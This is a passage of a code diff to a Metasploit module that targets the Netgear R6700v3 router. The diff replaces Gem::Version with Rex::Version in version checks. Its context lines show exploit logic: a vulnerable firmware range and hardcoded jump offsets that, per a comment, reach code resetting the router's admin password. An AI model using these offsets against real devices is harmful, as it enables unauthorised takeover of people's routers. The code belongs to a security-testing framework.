@@ -100,13 +100,13 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::UnexpectedReply, 'Failed to obtain device version: no version number found in response') # Taken from https://stackoverflow.com/questions/4115115/extract-a-substring-from-a-string-in-ruby-using-a-regular-expression
     end
     raw_version_number = version[0].gsub('V', '') # If we got a result, then take the first result from the returned array, and remove the leading 'V'.
-    Gem::Version.new(raw_version_number) # Finally lets turn it into a Gem::Version object for later use in other parts of the code.
+    Rex::Version.new(raw_version_number) # Finally lets turn it into a Rex::Version object for later use in other parts of the code.
   end
 
   def check
     target_version = retrieve_version
     print_status("Target is running firmware version #{target_version}")
-    if (target_version < Gem::Version.new('1.0.4.94')) && (target_version >= Gem::Version.new('1.0.2.62'))
+    if (target_version < Rex::Version.new('1.0.4.94')) && (target_version >= Rex::Version.new('1.0.2.62'))
       return Exploit::CheckCode::Appears
     else
       return Exploit::Checkcode::Safe
@@ -115,12 +115,12 @@ class MetasploitModule < Msf::Auxiliary
 
   def find_offset
     target_version = retrieve_version
-    if target_version == Gem::Version.new('1.0.4.84')
+    if target_version == Rex::Version.new('1.0.4.84')
       print_status("#{peer} - Identified Netgear R6700v3 (firmware V1.0.0.4.84_10.0.58) as the target.")
       # this offset is where execution will jump to
       # a part in the middle of the binary that resets the admin password
       return "\x58\x9a\x03"
-    elsif target_version == Gem::Version.new('1.0.4.82')
+    elsif target_version == Rex::Version.new('1.0.4.82')
       print_status("#{peer} - Identified Netgear R6700v3 (firmware V1.0.0.4.82_10.0.57) as the target.")
       return "\x48\x9a\x03"
     end
